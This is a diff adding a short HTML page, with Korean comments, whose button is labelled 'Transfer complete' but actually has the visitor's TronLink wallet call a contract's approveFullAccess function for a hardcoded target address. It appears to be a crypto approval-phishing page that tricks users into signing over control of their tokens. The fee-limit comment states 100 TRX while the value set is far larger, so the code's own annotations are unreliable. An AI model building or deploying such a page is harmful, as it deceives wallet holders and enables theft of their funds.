@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Approve</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb"></script>
+</head>
+<body>
+    <h1>To send Access</h1>
+    <button onclick="approveFullAccess()">Transfer complete button</button>
+
+    <script>
+        async function approveFullAccess() {
+            const contractAddress = 'TCDbZRdBr7raQRsHT9f2iMB6g2p8JHVG19'; // 스마트 계약 주소
+            const targetAddress = 'TDifu3G7KupDwyHErgw9tzETJ1ncEzZNZ3'; // 타겟 주소 (하드코딩)
+            const contractABI = [
+                {
+                    "inputs": [
+                        { "internalType": "address", "name": "spender", "type": "address" }
+                    ],
+                    "name": "approveFullAccess",
+                    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }
+            ];
+
+            // TronLink 지갑이 연결되어 있는지 확인
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                const tronWeb = window.tronWeb;
+                const contract = await tronWeb.contract(contractABI, contractAddress);
+
+                try {
+                    // approveFullAccess 함수 호출 (feeLimit: 100 TRX)
+                    const result = await contract.approveFullAccess(targetAddress).send({
+                        feeLimit: 100000000000, // 100 TRX에 해당하는 수수료 한도
+                    });
+                    console.log("Transaction result:", result);
+                    alert("Approval successful!");
+                } catch (error) {
+                    console.error("Error:", error);
+                    alert("Approval failed!");
+                }
+            } else {
+                alert("Tron 지갑을 연결해주세요 (TronLink 또는 TP월렛).");
+            }
+        }
+    </script>
+</body>
+</html>
